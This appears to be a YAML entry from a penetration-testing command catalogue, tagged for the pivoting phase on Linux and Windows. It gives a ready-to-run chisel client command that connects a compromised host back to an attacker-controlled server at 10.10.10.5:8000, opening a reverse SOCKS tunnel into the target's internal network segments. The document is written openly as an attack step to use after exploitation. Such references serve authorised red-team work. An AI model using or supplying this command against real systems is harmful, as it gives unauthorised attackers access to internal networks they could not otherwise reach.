---
description: |
  Once code execution is achieved on a compromised host, the chisel client can be dropped and executed to connect back to an attacker-controlled chisel server, establishing a reverse SOCKS tunnel. The R:socks remote specification instructs the server to expose a local SOCKS5 proxy that routes traffic through the compromised host, giving the attacker network access to any internal segments the target can reach.

  Command Reference:

  	Attacker IP: 10.10.10.5

  	Listen Port: 8000

command: |
  chisel client 10.10.10.5:8000 R:socks
items:
  - Shell
OS:
  - Linux
  - Windows
phases:
  - Pivoting
references:
  - https://github.com/jpillora/chisel
  - https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
---
